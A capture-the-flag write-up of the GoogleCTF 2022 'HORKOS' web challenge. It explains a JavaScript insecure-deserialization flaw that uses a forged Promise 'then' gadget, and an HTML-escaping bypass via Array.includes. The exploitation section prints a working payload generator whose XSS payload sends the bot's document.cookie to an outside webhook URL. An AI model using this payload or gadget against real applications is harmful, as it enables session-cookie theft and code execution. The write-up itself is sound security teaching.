# Insecure Deserialization in JavaScript: GoogleCTF 2022 Web/HORKOS Writeup - Huli
We all heard about insecure deserialization vulnerability and saw many real-world cases in Java, PHP, and other languages.

But, we rarely hear about this vulnerability in JavaScript. I think it’s because the built-in serialization/deserialization function `JSON.parse` and `JSON.stringify` are only for basic data structures like string, number, array and object.

Class and function are not supported, so there is no way to run malicious code during deserialization.

What if we implement our deserialization logic and support class and function? What could possibly go wrong?

GoogleCTF 2022 has a web challenge called “HORKOS,” which shows us the way.

Overview
--------

Before digging into the vulnerability in the challenge, we need to know how it works first.

This challenge is like a shopping website:

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/d6dd4f08-b9b1-49ac-bf4f-9e5fc2ff5781.png?raw=true)
](https://blog.huli.tw/img/googlectf-2022-horkos-writeup/p1.png)

[checkout page](https://blog.huli.tw/img/googlectf-2022-horkos-writeup/p1.png)

After selecting what you want and pressing the “CHECKOUT” button, a request will be sent to `POST /order` with a JSON string.

Here is what the JSON looks like when I add one tomato to my shopping cart:

```js hljs
[
   {
    "key":"0",
    "type":"pickledShoppingCart",
    "value":[
     {
      "key":"items",
      "type":"pickledObject",
      "value":[
         {
          "key":"Tomato",
          "type":"pickledItem",
          "value":[
           {
            "key":"price",
            "type":"Number",
            "value":10
           },
           {
            "key":"quantity",
            "type":"String",
            "value":"1"
           }
          ]
         },
         {
          "key":"Pickle",
          "type":"pickledItem",
          "value":[
           {
            "key":"price",
            "type":"Number",
            "value":8
           },
           {
            "key":"quantity",
            "type":"String",
            "value":"0"
           }
          ]
         },
         {
          "key":"Pineapple",
          "type":"pickledItem",
          "value":[
           {
            "key":"price",
            "type":"Number",
            "value":44
           },
           {
            "key":"quantity",
            "type":"String",
            "value":"0"
           }
          ]
         }
      ]
     },
     {
      "key":"address",
      "type":"pickledAddress",
      "value":[
         {
          "key":"street",
          "type":"String",
          "value":"my"
         },
         {
          "key":"number",
          "type":"Number",
          "value":0
         },
         {
          "key":"zip",
          "type":"Number",
          "value":0
         }
      ]
     },
     {
      "key":"shoppingCartId",
      "type":"Number",
      "value":462044767240
     }
    ]
   }
]
```

After that, the user will be redirected to another `/order` page to see the order:

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/86c76ac8-26fe-4f7c-bd44-9d6655524252.png?raw=true)
](https://blog.huli.tw/img/googlectf-2022-horkos-writeup/p2.png)

[order page](https://blog.huli.tw/img/googlectf-2022-horkos-writeup/p2.png)

It’s worth noting that the URL looks like this:

```plain hljs
https://horkos-web.2022.ctfcompetition.com/order#W1t7ImtleSI6ImNhcnQiLCJ0eXBlIjoicGlja2xlZFNob3BwaW5nQ2FydCIsInZhbHVlIjpbeyJrZXkiOiJpdGVtcyIsInR5cGUiOiJwaWNrbGVkT2JqZWN0IiwidmFsdWUiOlt7ImtleSI6IlRvbWF0byIsInR5cGUiOiJwaWNrbGVkSXRlbSIsInZhbHVlIjpbeyJrZXkiOiJwcmljZSIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6MTB9LHsia2V5IjoicXVhbnRpdHkiLCJ0eXBlIjoiU3RyaW5nIiwidmFsdWUiOiIxIn1dfSx7ImtleSI6IlBpY2tsZSIsInR5cGUiOiJwaWNrbGVkSXRlbSIsInZhbHVlIjpbeyJrZXkiOiJwcmljZSIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6OH0seyJrZXkiOiJxdWFudGl0eSIsInR5cGUiOiJTdHJpbmciLCJ2YWx1ZSI6IjAifV19LHsia2V5IjoiUGluZWFwcGxlIiwidHlwZSI6InBpY2tsZWRJdGVtIiwidmFsdWUiOlt7ImtleSI6InByaWNlIiwidHlwZSI6Ik51bWJlciIsInZhbHVlIjo0NH0seyJrZXkiOiJxdWFudGl0eSIsInR5cGUiOiJTdHJpbmciLCJ2YWx1ZSI6IjAifV19XX0seyJrZXkiOiJhZGRyZXNzIiwidHlwZSI6InBpY2tsZWRBZGRyZXNzIiwidmFsdWUiOlt7ImtleSI6InN0cmVldCIsInR5cGUiOiJTdHJpbmciLCJ2YWx1ZSI6Im15In0seyJrZXkiOiJudW1iZXIiLCJ0eXBlIjoiTnVtYmVyIiwidmFsdWUiOjB9LHsia2V5IjoiemlwIiwidHlwZSI6Ik51bWJlciIsInZhbHVlIjowfV19LHsia2V5Ijoic2hvcHBpbmdDYXJ0SWQiLCJ0eXBlIjoiTnVtYmVyIiwidmFsdWUiOjQ2MjA0NDc2NzI0MH1dfSx7ImtleSI6ImRyaXZlciIsInR5cGUiOiJwaWNrbGVkRHJpdmVyIiwidmFsdWUiOlt7ImtleSI6InVzZXJuYW1lIiwidHlwZSI6IlN0cmluZyIsInZhbHVlIjoiam9obm55d2Fsa2VyIn0seyJrZXkiOiJvcmRlcnMiLCJ0eXBlIjoicGlja2xlZEFycmF5IiwidmFsdWUiOltdfV19LHsia2V5Ijoib3JkZXJJZCIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6NDYyMDQ0NzY3MjQwfV1d
```

It’s obviously a base64 encoded string. If we decode it, the result is another similar JSON string:

```js hljs
[
   [
    {
     "key":"cart",
     "type":"pickledShoppingCart",
     "value":[
      {
         "key":"items",
         "type":"pickledObject",
         "value":[
          {
           "key":"Tomato",
           "type":"pickledItem",
           "value":[
            {
               "key":"price",
               "type":"Number",
               "value":10
            },
            {
               "key":"quantity",
               "type":"String",
               "value":"1"
            }
           ]
          },
          {
           "key":"Pickle",
           "type":"pickledItem",
           "value":[
            {
               "key":"price",
               "type":"Number",
               "value":8
            },
            {
               "key":"quantity",
               "type":"String",
               "value":"0"
            }
           ]
          },
          {
           "key":"Pineapple",
           "type":"pickledItem",
           "value":[
            {
               "key":"price",
               "type":"Number",
               "value":44
            },
            {
               "key":"quantity",
               "type":"String",
               "value":"0"
            }
           ]
          }
         ]
      },
      {
         "key":"address",
         "type":"pickledAddress",
         "value":[
          {
           "key":"street",
           "type":"String",
           "value":"my"
          },
          {
           "key":"number",
           "type":"Number",
           "value":0
          },
          {
           "key":"zip",
           "type":"Number",
           "value":0
          }
         ]
      },
      {
         "key":"shoppingCartId",
         "type":"Number",
         "value":462044767240
      }
     ]
    },
    {
     "key":"driver",
     "type":"pickledDriver",
     "value":[
      {
         "key":"username",
         "type":"String",
         "value":"johnnywalker"
      },
      {
         "key":"orders",
         "type":"pickledArray",
         "value":[
          
         ]
      }
     ]
    },
    {
     "key":"orderId",
     "type":"Number",
     "value":462044767240
    }
   ]
]
```

That’s it, it seems that it’s a tiny web application without too many features.

Source code - rendering
-----------------------

Let’s see how it works under the hood.

Below is the source code for the core function:

```js hljs
const script = new VMScript(fs.readFileSync('./shoplib.mjs').toString().replaceAll('export ','') + `
sendOrder(cart, orders)
`);

app.post('/order', recaptcha.middleware.verify, async (req,res)=>{
  req.setTimeout(1000);
  
  if (req.recaptcha.error && process.env.NODE_ENV != "dev") {
    res.writeHead(400, {'Content-Type': 'text/html'});
    return await res.end("invalid captcha");
  }

  if (!req.body.cart) {
    res.writeHead(400, {'Content-Type': 'text/html'});
    return await res.end("bad request")
  }

  
  let orders = [];
  let cart = req.body.cart;
  let vm = new VM({sandbox: {orders, cart}});

  let result = await vm.run(script);

  orders = new Buffer.from(JSON.stringify(orders)).toString('base64');

  let url = '/order#' + orders;
  
  bot.visit(CHALL_URL + url);

  res.redirect(url);
});
```

Our input, `req.body.cart` is pass to a VM and run `sendOrder(cart, orders)`.

After `sendOrder`, the `orders` array will be updated and sent to `/order` as the parameter. Then, the user will be redirected to the order page, and a bot will also visit the page.

Here is the JavaScript code on the order page:

```js hljs
import * as shop from "/js/shoplib.mjs";

window.onload = () => {
    let orders = JSON.parse(atob(location.hash.substr(1)));
    console.log(orders);
    
    (orders).forEach((order) =>  {
        const client = new shop.DeliveryClient(order);
        document.all.order.innerHTML += client;
    })
}
```

`client` will be assigned to `innerHTML`, if we can inject HTML here, we got an XSS that allows us to steal the information(like cookie) of the admin bot.

Below is the related code snippet for rending HTML:

```js hljs
const escapeHtml = (str) => str.includes('<') ? str.replace(/</g, c => `&#${c.charCodeAt()};`) : str;
const renderLines = (arr) => arr.reduce((p,c) => p+`
<div class="row">
<div class="col-xl-8">
  <p>${escapeHtml(c.key).toString()}</p>
</div>
<div class="col-xl-2">
  <p class="float-end">${escapeHtml(getValue(c.value, 'quantity').toString())}
  </p>
</div>
<div class="col-xl-2">
  <p class="float-end">${escapeHtml(getValue(c.value, 'price').toString())}
  </p>
</div>
<hr>
</div>`, '');

const getValue = (a, p) => p.split('/').reduce((arr,k) => arr.filter(e=>e.key==k)[0].value, a);

const renderOrder = (arr) => {
    return `
    <div class="container">
      <p class="my-5 mx-5" style="font-size: 30px;">Delivery Information</p>
      <div class="row">
        <ul class="list-unstyled">
          <li class="text-black">${escapeHtml(getValue(arr,'cart/address/street').toString())} ${escapeHtml(getValue(arr,'cart/address/number').toString())}</li>
          <li class="text-muted mt-1"><span class="text-black">Invoice</span> #${escapeHtml(getValue(arr, 'orderId').toString())}</li>
          <li class="text-black mt-1">${new Date().toDateString()}</li>
        </ul>
        <hr>
      </div>
      
      ${renderLines(getValue(arr, 'cart/items'))}

      <div class="row text-black">
        <div class="col-xl-12">
          <p class="float-end fw-bold">Total: $1337
          </p>
        </div>
        <hr style="border: 2px solid black;">
      </div>
      <div class="text-center" style="margin-top: 90px;">
        <p>Delivered by ${escapeHtml(getValue(arr, 'driver/username').toString())}. </p>
      </div>

    </div>
`;    
};

export class DeliveryClient {
    constructor(pickledOrder) {
        this.pickledOrder = pickledOrder;
    }
    toString() {
        return renderOrder(this.pickledOrder);
    }
};
```

There is a `escpaeHtml` function to do the sanitization, it encodes all `<` if `<` is in the input.

Also, we can see that almost all variables are escaped before rendering to the page, it seems that we have no chance to do something bad?

Not exactly, if you look very carefully.

In function `renderLines`, this line is different:

```html hljs
<p>${escapeHtml(c.key).toString()}</p>
```

Why? Because all the other places are `escape(something.toString())`, cast the input to string then escape, but the one above cast to string “after” escaped.

If you are familiar with JavaScript, besides `String.prototype.includes`, there is another function with the same name: `Array.prototype.includes`.

`String.prototype.includes` checks if the target is in the string while `Array.prototype.includes` checks if the target is in the array.

For example, `['<p>hello</p>'].includes('<')` is false because there no `'<'` element in the array.

In other words, if `c.key` is an array, we can bypass the check and rendering `<`, which caused XSS.

Now, we have already finished the second half of the challenge. All we need to do is to find the solution for the first half: “how do we make `c.key` an array?”

Source code - generating order data
-----------------------------------

As I mentioned earlier, the order data is generated by `sendOrder` function, our goal is to find the vulnerability in its implementation and manipulate the order data.

Below is the related source code:

```js hljs
export const pickle = {
    PRIMITIVES: ['String', 'Number', 'Boolean'],
    loads: json => {
        const obj = {};
        for (const {key, type, value} of json) {
            if (type.match(/^pickled/)) {
                obj[key] = pickle.loads(value);
                const constructor = type.replace(/^pickled/, '');
                obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
            } else {
                obj[key] = new globalThis[type](value);
            }
        }
        return obj;
    },
    dumps: obj => {
        const json = [];
        for (const key in obj) {
            const value = obj[key];
            const type = value.constructor.name;
            if (typeof type !== 'string') continue;
            if (typeof value == 'object' && !pickle.PRIMITIVES.includes(type)) {
                json.push({
                    key,
                    type: 'pickled' + type,
                    value: pickle.dumps(value)
                });
            } else if (typeof value !== 'undefined') {
                json.push({
                    key,
                    type,
                    value: globalThis[type].prototype.valueOf.call(value)
                });
            }
        }
        return json;
    }
};

const DRIVERS = ['drivefast1', 'johnnywalker', 'onagbike'];

export const sendOrder = async (value, orders) => {
    const delivery = new DeliveryService(new Order(
        pickle.loads(JSON.parse(value))[0]
    ), orders);
    return delivery.sendOrder();
};

export class Driver {
    constructor(username, orders) {
        this.username = username;
        this.orders = orders;
    }
    async sendOrder(order) {
        order.driver = this;
        const pickledOrder = pickle.dumps(order);
        this.orders.push(pickledOrder);
        return true;
    }
};
export class DeliveryClient {
    constructor(pickledOrder) {
        this.pickledOrder = pickledOrder;
    }
    toString() {
        return renderOrder(this.pickledOrder);
    }
};
export class DeliveryService {
    constructor(order, orders) {
        this.order = order;
        this.orders = orders;
    }
    findDriver() {
        return new Driver(
            DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders);
    }
    async sendOrder() {
        const driver = this.findDriver();
        if (await driver.sendOrder(this.order)) {
            return this.order.orderId;
        }
    }
};
export class Order {
    constructor(cart) {
        this.cart = cart;
        this.driver = null;
        this.orderId = this.cart.shoppingCartId;
    }
};
export class ShoppingCart {
    constructor() {
        this.items = {};
        this.address = '';
        this.shoppingCartId = Math.floor(Math.random() * 1000000000000);
    }
    addItem(key, item) {
        this.items[key] = item;
    }
    removeItem(key) {
        delete this.items[key];
    }
};
export class Item {
    constructor(price) {
        this.price = price;
    }
    setQuantity(num) {
        this.quantity = num;
    }
};
export class Address {
    constructor(street, number, zip) {
        this.street = street;
        this.number = number;
        this.zip = zip;
    }
};
```

First, `sendOrder` is called, and our input(`value`) is parsed as JSON and then deserialized by `pickle.loads`.

Then, a new DeliveryService is created and `delivery.sendOrder` is called.

```js hljs
export const sendOrder = async (value, orders) => {
    const delivery = new DeliveryService(new Order(
        pickle.loads(JSON.parse(value))[0]
    ), orders);
    return delivery.sendOrder();
};
```

In `DeliveryService.sendOrder`, there will be a random driver to send your order, and return `this.order.orderId`.

```js hljs
export class DeliveryService {
    constructor(order, orders) {
        this.order = order;
        this.orders = orders;
    }
    findDriver() {
        return new Driver(
            DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders);
    }
    async sendOrder() {
        const driver = this.findDriver();
        if (await driver.sendOrder(this.order)) {
            return this.order.orderId;
        }
    }
};
```

In `Driver.sendOrder`, the driver is assigned to the order, and `pickle.dumps(order)` is pushed to `this.orders`, which returns to the user and shows on the `/order` page in the end.

```js hljs
export class Driver {
    constructor(username, orders) {
        this.username = username;
        this.orders = orders;
    }
    async sendOrder(order) {
        order.driver = this;
        const pickledOrder = pickle.dumps(order);
        this.orders.push(pickledOrder);
        return true;
    }
};
```

How does deserialization works?
-------------------------------

In JavaScript, class instance is just an object whose constructor points to the class and `__proto__` points to the prototype of the class.

```js hljs
class A {
  constructor(num) {
    this.num = num
  }
  hello() {
    console.log(this.num)
  }
}
var obj = new A(123)
console.log(typeof obj) 
console.log(obj.constructor === A) 
console.log(obj.__proto__ === A.prototype) 
obj.hello() 
```

So, it’s easy to create an instance of `A` without `new` operator:

```js hljs
class A {
  constructor(num) {
    this.num = num
  }
  hello() {
    console.log(this.num)
  }
}
var obj = {
  num: 123
}
obj.__proto__ = A.prototype
obj.hello() 
```

It’s basically what `pickle.loads` does, recreate the object and assign the correct prototype according to the `type` key.

Trying to mess up prototype
---------------------------

After understanding how it works, my first thought is to mess up the prototype chain to achieve something unexpected.

This part is the most suspicious, in my opinion:

```js hljs
export const pickle = {
  PRIMITIVES: ['String', 'Number', 'Boolean'],
  loads: json => {
    const obj = {};
    for (const {key, type, value} of json) {
      if (type.match(/^pickled/)) {
        obj[key] = pickle.loads(value);
        const constructor = type.replace(/^pickled/, '');
        obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
      } else {
        obj[key] = new globalThis[type](value);
      }
    }
    return obj;
  }
};
```

The first thing I noticed is that I can create a function if the type is `Function`, because `globalThis['Function']` is a function constructor.

If I can find a way to run the function, I can get an RCE in the sandbox and manipulate the orders. But I can’t find one at the moment.

The second thing I tried is to let `key` equals to `__proto__`, so that I can control `obj.__proto__.__proto__` which is `Object.prototype.__proto__`, the prototype of `Object.prototype`.

But this does not work because it’s not allowed. You will get an error like this:

> TypeError: Immutable prototype object ‘#<Object>’ cannot have their prototype set

The third thing I came up with is “prototype confusion”, look at this part:

```js hljs
if (type.match(/^pickled/)) {
  obj[key] = pickle.loads(value);
  const constructor = type.replace(/^pickled/, '');
  obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
}
```

`pickle.loads` always returns an object, so `obj[key]` is an object. But, if the type is `pickledString`, its prototype will be `String.prototype`.

So, we can have a weird object whose prototype is `String`. We messed up the prototype! But, unfortunately, it’s useless in this challenge.

After playing around with the pickle function for hours and finding nothing useful, I decided to take a step back.

The essence of insecure deserialization
---------------------------------------

The most suspicious part of the challenge is the `pickle` function, which is responsible for deserializing data. So, I assumed it’s a challenge about insecure deserialization.

What is the essence of insecure deserialization? Or put it in another way, what makes deserialization “insecure”?

My answer is: “unexpected object” and “magic function”.

For example, when we do the deserialization in the application, it usually is to load our data. The reason why deserialization is a vulnerability is that it can be exploited by loading “unexpected object”, like [common gadgets](https://github.com/ambionics/phpggc) in popular libraries.

Also, the “magic function” is important in PHP, like `__wakeup`, `__destruct` or `__toString` and so on. Those magic functions can help the attacker to find the gadget.

Back to the challenge, it’s written in JavaScript, what are the magic functions in JavaScript?

1.  `toString`
2.  `valueOf`
3.  `toJSON`

So, based on this new mindset, I rechecked the code to see if I could find somewhere interesting.

Although none of the functions has been called on our deserialized object, I did find an interesting place:

```js hljs
export class DeliveryService {
  constructor(order, orders) {
    this.order = order;
    this.orders = orders;
  }
  findDriver() {
    return new Driver(
      DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders);
  }
  async sendOrder() {
    const driver = this.findDriver();
    if (await driver.sendOrder(this.order)) {
      return this.order.orderId;
    }
  }
};
```

Look at the `sendOrder` function, it’s an `async` function and it returns `this.order.orderId`. It means that if `this.order.orderId` is a `Promise`, it will be resolved, even without `await`.

`Promise.then` is another magic function.

```js hljs
async function test() {
  const p = new Promise(resolve => {
    console.log('hello')
    resolve()
  })
  return p
}

test()
```

Paste it to the browser console and run, you will see `hello` printed in the console.

It’s easy to build a serialized `Promise`, we only need a `then` function:

```js hljs
async function test() {
  var obj = {
    then: function(resolve) {
      console.log(123)
      resolve()
    }
  }
  
  obj.__proto__ = Promise.prototype
  return obj
}


test()
```

The serialized object looks like this:

```js hljs
{
  "key":"shoppingCartId",
  "type":"pickledPromise",
  "value":[
    {
      "key":"then",
      "type":"Function",
      "value":"globalThis.orders.push(JSON.parse('"+payload+"'));arguments[0]();"
    }
  ]
}
```

`arguments[0]` is the `resolve` function, we need to call it otherwise the program is hanged.

As I mentioned earlier, if we can find a way to run a function, we can push our payload to `orders`.

Exploitation
------------

To sum up, we can get the flag by the following steps:

1.  Craft a serialized object with a malicious `then` function in the `orderId`
2.  Manipulate `globalThis.orders` to insert our data with XSS payload
3.  The admin bot load our payload and trigger XSS
4.  Steal cookie

Below is what I use to test and generate the payload:

(BTW, we don’t need to insert a new record actually, just modify `orders[0]` to our xss payload. It’s easier and also works)

```js hljs
const {VM, VMScript} = require("vm2");
const fs = require('fs');

const script = new VMScript(fs.readFileSync('./myshoplib.mjs').toString().replaceAll('export ','') + `
sendOrder(cart, orders)
`);

async function main () {
  let orders = [];
  
  let payload = JSON.stringify([
    {
      'key': 'cart',
      'type': 'pickledShoppingCart',
      'value': [
        {
          'key': 'items',
          'type': 'pickledObject',
          'value': [
            {
              'key': ['<img src=x onerror="location=`https://webhook.site/d8dc1452-8e82-408d-9dcf-8ad713754f36/?q=${encodeURIComponent(document.cookie)}`">'],
              'type': 'pickledItem',
              'value': [
                {
                  'key': 'price',
                  'type': 'Number',
                  'value': 10
                },
                {
                  'key': 'quantity',
                  'type': 'String',
                  'value': '1'
                }
              ]
            }
          ]
        },
        {
          'key': 'address',
          'type': 'pickledAddress',
          'value': [
            {
              'key': 'street',
              'type': 'String',
              'value': ''
            },
            {
              'key': 'number',
              'type': 'Number',
              'value': 0
            },
            {
              'key': 'zip',
              'type': 'Number',
              'value': 0
            }
          ]
        },
        {
          'key': 'shoppingCartId',
          'type': 'String',
          'value': 800600798186
        }
      ]
    },
    {
      'key': 'driver',
      'type': 'pickledDriver',
      'value': [
        {
          'key': 'username',
          'type': 'String',
          'value': 'johnnywalker'
        },
        {
          'key': 'orders',
          'type': 'pickledArray',
          'value': []
        }
      ]
    },
    {
      'key': 'orderId',
      'type': 'String',
      'value': 'PEW'
    }
  ]).replaceAll('"', '\\"')

  
  let cart = JSON.stringify(
    [{"key":"0","type":"pickledShoppingCart","value":[{"key":"items","type":"pickledObject","value":[{"key":"Tomato","type":"pickledItem","value":[{"key":"price","type":"Number","value":10},{"key":"quantity","type":"String","value":"1"}]},{"key":"Pickle","type":"pickledItem","value":[{"key":"price","type":"Number","value":8},{"key":"quantity","type":"String","value":"0"}]},{"key":"Pineapple","type":"pickledItem","value":[{"key":"price","type":"Number","value":44},{"key":"quantity","type":"String","value":"0"}]}]},{"key":"address","type":"pickledAddress","value":[{"key":"street","type":"String","value":"1"},{"key":"number","type":"Number","value":0},{"key":"zip","type":"Number","value":0}]},{"key":"shoppingCartId","type":"pickledPromise","value":[{"key":"then","type":"Function","value":"globalThis.orders.push(JSON.parse('"+payload+"'));arguments[0]();"}]}]}]
  );


  let vm = new VM({sandbox: {orders, cart, console}});
  try {
    let result = await vm.run(script);
  } catch(err){
    console.log('err', err)
  }
  console.log('orders')
  console.log(orders)

  console.log(encodeURIComponent(cart))

}
main()
```

Conclusion
----------

This challenge shows us how a simple deserialization function can be abused by crafting a `Promise` with a malicious `then` function.

You can return anything in an `async` function, but if you return a `Promise`, it will be resolved first as per the [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function#:~:text=async%20function%20is-,implicitly%20wrapped,-in%20Promise.resolve) documentation.

Thanks Pew for solving the second part and other team members for the great teamwork.

![](chrome-extension://mapjgeachilmcbbokkgcbgpbakaaeehi/assets/check.svg)
The action has been successful